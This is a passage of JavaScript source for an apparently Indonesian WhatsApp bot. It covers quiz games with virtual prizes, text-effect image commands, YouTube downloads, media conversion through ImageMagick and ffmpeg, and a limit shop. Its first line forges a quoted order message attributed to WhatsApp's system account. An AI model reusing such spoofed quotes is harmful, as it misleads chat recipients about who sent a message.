xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : jumlahTroli, status: 1,surface : 2,message: `🆔「 ${pushname} 」\n🎵 ${anjir}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/fake.jpeg'), sellerJid: '0@s.whatsapp.net'}}}, ptt: true, contextInfo: forward})
}
}
	
//AUTO RESPON IMAGE
if (imagenye.includes(messagesC)){
namastc = messagesC
buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
xdev.sendMessage(from, buffer, image, {quoted : dev})
}

//AUTO RESPON VIDEO
if (videonye.includes(messagesC)){
namastc = messagesC
buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
xdev.sendMessage(from, buffer, video, {quoted : dev})
}
	   
//AKSES PRIVATE 
if (!isGroup && !isOwner && !isPremium && isCmd && chatBot === true) { 
if(autovn) return sendvn(gakmau)
return setReply(teksChat)
}

//DOWNLOAD MP4
const downloadMp4 = async (Link ) => {
mp4File = getRandom('.mp4') 
ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp4File), video, {quoted: dev, caption: "Nih"})        
fs.unlinkSync(`./${mp4File}`)
})       
}

//DOWNLOAD MP3
const downloadMp3 = async (Link ) => {
mp3File = getRandom('.mp3') 
ytdl(Link, { filter: 'audioonly'})
.pipe(fs.createWriteStream(mp3File))
.on("finish", async () => {    
await xdev.sendMessage(from, fs.readFileSync(mp3File), audio, {quoted: dev, caption: "Nih"})        
fs.unlinkSync(`./${mp3File}`)
})       
}

//========================================================================================================================//
colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
const isImage = (type === 'imageMessage')
const isVideo = (type === 'videoMessage')
const isSticker = (type == 'stickerMessage')
const isAudio = (type == 'audioMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage')
const isViewOnce = (type == 'viewOnceMessage')
const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedextendedText = type === 'extendedTextMessage' && content.includes('extendedTextMessage')
					
if (!isGroup && !isCmd ) console.log(color("[PRIVATE]", "greenyellow"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && !isCmd ) console.log(color("[GRUP]", "gold"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(budy, "cyan"), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
if (!isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
if (isGroup && isCmd ) console.log(color("[CMD]", "blue"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`, 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'), color('di gc', 'purple'), color(groupName, "deeppink"))
			
_sewa.expiredCheck(xdev, sewa)
_prem.expiredCheck(premium)

	
  // Tictactoe
if (isTicTacToe(from, tictactoe)) {
tictac(chatss, prefix, tictactoe, from, sender, setReply, mentions, addBalance, user)
}


const caklonte = async (deskripsi ) => {
caklontong1.splice(from, 1);
console.log(deskripsi)
}
//Game cak lontong    
const butckl = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}caklontong`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuCkl(xdev, caklontong, sendButMessage, butckl, caklonte)

if (game.isCkl(from, caklontong)){
if(budy.includes("yerah")){
teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanCkl(from, caklontong)}\n\n`
for (let icak of caklontong1){
 teks += `${icak}`
 }
sendButMessage(from, teks, copyright, butckl) 
caklontong.splice(game.getCklPosi(from, caklontong), 1)
caklontong1.splice(from, 1);
return
}
if (chatss.toLowerCase().includes(game.getJawabanCkl(from, caklontong))){
var htgtk = randomNomor(1500)
addBalance(senderNumber, htgtk, user)
teks = `*GAME CAK LONTONG*
Selamat jawaban kamu benar
Hadiah : Rp ${htgtk.toLocaleString()}\n\n`
for (let icak of caklontong1){
 teks += `${icak}`
 }
sendButMessage(from, teks, copyright, butckl) 
caklontong.splice(game.getCklPosi(from, caklontong), 1)
caklontong1.splice(from, 1);
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}
 
//Game tebak kata
const butkta = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakkata`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
 game.cekWaktuTK(xdev, tebakkata, sendButMessage, butkta)
if (game.isTebakKata(from, tebakkata)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTK(from, tebakkata)}`
sendButMessage(from, teks, copyright, butkta) 
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTK(from, tebakkata))){
var htgtk = randomNomor(1500)
addBalance(senderNumber, htgtk, user)
teks = `*GAME TEBAK KATA*
Selamat jawaban kamu benar
Jawaban : ${game.getJawabanTK(from, tebakkata)}
Hadiah : Rp ${htgtk.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakkata
atau tekan button di bawah ini`
sendButMessage(from, teks, copyright, butkta) 
tebakkata.splice(game.getTKPosi(from, tebakkata), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}
 
 //Game tebak gambar
const butgam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakgambar`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTG(xdev, tebakgambar, sendButMessage, butgam)

if (game.isTebakGambar(from, tebakgambar)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTG(from, tebakgambar)}`
sendButMessage(from, teks, copyright, butgam) 
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTG(from, tebakgambar))){
var htgm = randomNomor(1500)
addBalance(senderNumber, htgm, user)
teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanTG(from, tebakgambar)}\nHadiah : Rp ${htgm.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}tebakgambar\natau tekan button di bawah ini`
sendButMessage(from, teks, copyright, butgam) 
tebakgambar.splice(game.getTGPosi(from, tebakgambar), 1)
} else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}

//Game Math
const butmtk = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}math easy`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuMtk(xdev, mtk, sendButMessage, butmtk)
if (game.isMtk(from, mtk)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanMtk(from, mtk)}`
sendButMessage(from, teks, copyright, butmtk) 
mtk.splice(game.getMtkPosi(from, mtk), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanMtk(from, mtk)) && !itsMe){
var htgm3 = randomNomor(1500)
addBalance(senderNumber, htgm3, user)
teks = `*Selamat jawaban kamu benar*\nJawaban : ${game.getJawabanMtk(from, mtk)}\nHadiah : Rp ${htgm3.toLocaleString()}\n\nIngin bermain lagi? kirim ${prefix}math\natau tekan button di bawah ini`
sendButMessage(from, teks, copyright, butmtk) 
mtk.splice(game.getMtkPosi(from, mtk), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}    


//Game family 100
const butfam = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}family100`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
 game.cekWaktuFam(xdev, family100, sendButMessage, butfam)
if (game.isfam(from, family100)){
 var anyingg = game.getjawaban100(from, family100)
 
 if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah :\n`
for (let i of anyingg){
teks += `- ${i}\n`
}
sendButMessage(from, teks, copyright, butfam) 
family100.splice(game.getfamposi(from, family100), 1)
return
}
 
for (let i of anyingg){
if (budy.toLowerCase().includes(i)){
var htgm1 = randomNomor(1500)
addBalance(senderNumber, htgm1 , user)
teks = `Selamat jawaban kamu benar\nJawaban : ${i}\nHadiah : Rp ${htgm1.toLocaleString()}\n\nJawaban yang blum tertebak : ${anyingg.length - 1}`
sendButMessage(from, teks, copyright, butfam) 
var anug = anyingg.indexOf(i)
anyingg.splice(anug, 1)
return
} else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
return
}
}

if (anyingg.length < 1){
setReply(`Semua jawaban sudah tertebak\nKirim ${prefix}family100 untuk bermain lagi`)
family100.splice(game.getfamposi(from, family100), 1)
}
}   


//Game tebak bendera
const butben = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakbendera`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTB(xdev, tebakbendera, sendButMessage, butben)

if (game.isTebakBendera(from, tebakbendera)){
if(budy.includes("Nyerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTB(from, tebakbendera)}`
sendButMessage(from, teks, copyright, butben) 
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTB(from, tebakbendera))){
var syahira = randomNomor(1500)
addBalance(senderNumber, syahira, user)
teks = `*GAME TEBAK BENDERA*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTB(from, tebakbendera)}\nHadiah : Rp ${syahira.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakbendera`
sendButMessage(from, teks, copyright, butben) 
tebakbendera.splice(game.getTBPosi(from, tebakbendera), 1)
} else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}

//Game tebak anime
const butanim = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebakanime`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTA(xdev, tebakanime, sendButMessage, butanim)
if (game.isTebakAnime(from, tebakanime)){
if(budy.includes("yerah")){
teks =`Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTA(from, tebakanime)}`
sendButMessage(from, teks, copyright, butanim) 
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTA(from, tebakanime))){
var vinna = randomNomor(1500)
addBalance(senderNumber, vinna, user)
teks =`*GAME TEBAK ANIME*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTA(from, tebakanime)}\nHadiah : Rp ${vinna.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebakanime`
sendButMessage(from, teks, copyright, butanim) 
tebakanime.splice(game.getTAPosi(from, tebakanime), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
} 	        

//Game tebak lirik
const butlirik = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}tebaklirik`, buttonText: { displayText: Mainlagi }, type: 1 } ];         
game.cekWaktuTL(xdev, tebaklirik, sendButMessage, butlirik)

if (game.isTebakLirik(from, tebaklirik)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanTL(from, tebaklirik)}`
sendButMessage(from, teks, copyright, butlirik) 
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanTL(from, tebaklirik)) && !itsMe){
var htgml = randomNomor(1500)
addBalance(senderNumber, htgml, user)
teks = `*GAME TEBAK LIRIK*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanTL(from, tebaklirik)}\nHadiah : Rp ${htgml.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}tebaklirik`
sendButMessage(from, teks, copyright, butlirik) 
tebaklirik.splice(game.getTLPosi(from, tebaklirik), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
} 

//Game siapa aku
const butaku = [{ buttonId: `${prefix}myprofile`, buttonText: { displayText: Myprofile }, type: 1 },{ buttonId: `${prefix}siapaaku`, buttonText: { displayText: Mainlagi }, type: 1 } ];      
game.cekWaktuSA(xdev, siapaaku, sendButMessage, butaku)
   
if (game.isSiapaAku(from, siapaaku)){
if(budy.includes("yerah")){
teks = `Yahaha malah nyerah\njawabanya itu adalah : ${game.getJawabanSA(from, siapaaku)}`
sendButMessage(from, teks, copyright, butaku) 
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
return
}
if (chatss.toLowerCase().includes(game.getJawabanSA(from, siapaaku))){
var htgmu = randomNomor(1500)
addBalance(senderNumber, htgmu, user)
teks = `*GAME SIAPAKAH AKU*
Selamat jawaban kamu benar\nJawaban : ${game.getJawabanSA(from, siapaaku)}\nHadiah : Rp ${htgmu.toLocaleString()}
Ingin bermain lagi? kirim ${prefix}siapakahaku`
sendButMessage(from, teks, copyright, butaku) 
siapaaku.splice(game.getSAPosi(from, siapaaku), 1)
}else if(type === 'conversation' && !command && !dev.key.fromMe){
setReply(jawabansalah)
}
}

const b1 = ["pukulin","kocok"]
const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]

//if (atibot === true) return 
                     
   
  

   




   
   
  
try{ 
switch (command) {
	
	
case 'tomp4':
case 'tovideo':
if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
setReply(mess.wait)
ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
file = await  xdev.downloadAndSaveMediaMessage(ger)
outGif = `./temp/${getRandom('.gif')}`
outMp4 = `./temp/${getRandom('.mp4')}`
status = false
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
 }      
sendVideo(fs.readFileSync(outMp4))
status = true
 if(status){
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
 status = false
 }
    })
}) 

}
break
	
	
case 'togif':
if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
setReply(mess.wait)
ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
file = await  xdev.downloadAndSaveMediaMessage(ger)
outGif = `./temp/${getRandom('.gif')}`
outMp4 = `./temp/${getRandom('.mp4')}`
status = false
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
 }      
sendGif(fs.readFileSync(outMp4))
status = true
 if(status){
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
 status = false
 }
    })
}) 

} else if(isQuotedVideo){
setReply(mess.wait)
ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
outMp4 = `${getRandom('.mp4')}`
file = await xdev.downloadMediaMessage(ger);
fs.writeFileSync(`./${outMp4}`, file);
sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(`./${outMp4}`)
}
break
	
	
	
	
	
	
	
	case 'blackping':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-blackpink-logo-style-online-1001.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	case 'glitch':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-impressive-glitch-text-effects-online-1027.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'glitch2':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-a-glitch-text-effect-online-free-1026.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'glitch3':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case '3dspace':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-space-3d-text-effect-online-985.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'lion':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks|teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case '3dneon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-3d-neon-light-text-effect-online-1028.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case 'neon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/neon-text-effect-online-879.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'greenneon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/green-neon-text-effect-874.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
   
   
   
   
   case 'bokeh':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/bokeh-text-effect-876.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
   
   
	
	
	case 'hollographic':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/holographic-3d-text-effect-975.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'bear':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	
	case 'wolf':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	teks1 = q.split("|")[0]
	teks2 = q.split("|")[1]
	textpro("https://textpro.me/create-wolf-logo-galaxy-online-936.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	
	
	
	case 'joker':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-logo-joker-online-934.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case 'dropwater':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/dropwater-text-effect-872.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	case 'neonlight':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	case 'thewall':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	
	case 'natural':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/natural-leaves-text-effect-931.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'carbon':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
	
	
	case 'pencil':
	if(!q) return setReply(`Penggunaan ${prefix + command} teks`)
	setReply(mess.wait)
	textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => sendFileFromUrl(data, image, {quoted: dev, caption: "Nih"}))
  .catch((err) => console.log(err));
   break
	
	
case 'shop':
teks = `
*]────「 SHOP」────[*

Halo ${pushname} 
Saldo : Rp ${getBalance(senderNumber, user).toLocaleString()}

• List Harga
1 Limit : Rp 1000
1 Limit Game : Rp 750
1 Jam Premium : Rp 50,000

NOTE :
Untuk membeli Limit ketik ${prefix}buylimit jumlah limit
Contoh : ${prefix}buylimit 10

Untuk membeli Limit Game ketik ${prefix}buyglimit jumlah limit
Contoh : ${prefix}buyglimit 10`
setReply(teks)
break

	
	         case 'tictactoe': case 'ttt': case 'ttc':
            if(!isGroup) return setsetReply("Hanya bisa di group")
		
                if (isTicTacToe(from, tictactoe)) return setReply(`Masih ada game yg blum selesai`)
            //    if (args.length < 2) return setReply(`Kirim perintah *${prefix}tictactoe* @tag`)
                if (mentionByTag.length == 1) {
				if (mentionByTag[0] === botNumber) return setReply(`Tidak bisa bermain dengan bot!`)
                if (mentionByTag[0] === sender) return setReply(`Sad amat main ama diri sendiri`)
                     var hadiah = randomNomor(2500)
				     mentions(`@${sender.split('@')[0]} menantang @${mentionByTag[0].split('@')[0]}\nuntuk bermain TicTacToe\n\nKetik Y untuk bermain 👊\nKetik N untuk menolak 👎\nKetik ${prefix}delttt untuk membatalkan permainan 🚫\n\nHadiah : Rp ${hadiah.toLocaleString()}`, [sender, mentionByTag[0]], false)
                     tictactoe.push({
                        id: from,
                        status: null,
						hadiah: hadiah,
                        penantang: sender,
                        ditantang: mentionByTag[0],
                        TicTacToe: ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣']
                     })
					 gameAdd(senderNumber, user)
                } else {
                    setReply(`Kirim perintah *${prefix}tictactoe* @tag`)
                }
                break
			case 'delttt':
            case 'delttc':
 if(!isGroup) return setsetReply("Hanya bisa di group")
				if (isGame(senderNumber, isOwner, gcount, user)) return setReply(`Limit game kamu sudah habis`)
                if (!isTicTacToe(from, tictactoe)) return setReply(`Tidak ada sesi game tictactoe di grup ini`)
                var posi = getPosTic(from, tictactoe)
                if (tictactoe[posi].penantang.includes(sender)) {
                    tictactoe.splice(posi, 1)
                    setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (tictactoe[posi].ditantang.includes(sender)) {
                     tictactoe.splice(posi, 1)
                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (isGroupAdmins) {
                     tictactoe.splice(posi, 1)
                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else if (isOwner) {
                     tictactoe.splice(posi, 1)
                     setReply(`Berhasil menghapus sesi tictactoe di grup ini`)
                 } else {
                   setReply(`Anda tidak bisa menghapus sesi tictactoe, karena bukan pemain!`)
                }
                break
                
                

	case 'download':
	setReply(mess.wait)
	vidioId = q.split("=")[1]
	downloadMp3(vidioId)
	break
	
	case 'woke':
      let info = await ytdl.getBasicInfo(q)
//let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');

console.log(info)

    break    
          
        
        case 'samehadaku':
        try{
          dato = await fetchJson(`https://zenzapi.xyz/api/samehadaku?apikey=${zenzkey}`)
         data = dato.result
         update = `\n*Berikut adalah update anime di samehadaku*\n`
         for ( let i of data){
    update +=`
Anime        : ${i.title}
Episode     : ${i.episode}
Posted By : ${i.postedBy}
Release     : ${i.release_time}\n`
foto = `${i.image}`
    }
    
  setReply(`${update}`)
  
		    
     let wou = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `Done`},"type": "RESPONSE"}]
     //await sendButLocation(from, update, copyright, fotonya, wou, {contextInfo: forward})
     } catch(err){
     	setReply(err)
     }
break
        
        
        case 'ytdownload':
        setReply(mess.wait)
        downloadMp3(q)
        break
        
	
	
	case 'cerpen':
	RA.RandomCerpen().then(respon => {
     teks =`*Author:* ${respon.author}\n*Judul:* ${respon.data.judul}\n*Kategori:* ${respon.data.kategori}\n\n${respon.data.cerita}`
   setReply(teks)
})
	break
	
	
	case 'wallpaper':
	setReply(mess.wait)
	if (isLimit(senderNumber, isPremium, isOwner, limitCount, user)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
	tod.wpsearch(`${q}`)
    .then(result => {
   const wallpaper = result[Math.floor(Math.random() * result.length)]              
    sendFileFromUrl(wallpaper, image, {quoted: dev, caption: "Nih"})
});
limitAdd(senderNumber, user)
break
	
	
	
case 'nsfwmenu':   
menunya = hentong.ahah(prefix, pushname)
let woker = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                       {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(hentong.ahah(prefix, pushname))
} else if(setmenu === "troli") {
sendTroli(hentong.ahah(prefix, pushname))
} else if(setmenu === "lokasi") {
costum(`*Loading...*`)
sendButLocation(from, menunya, `© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {contextInfo: forward})
} else if(setmenu === "gif") {
costum(`*Loading...*`)
sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
} else if(setmenu === "dokumen") {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), woker, options)
} else if(setmenu === "image") {
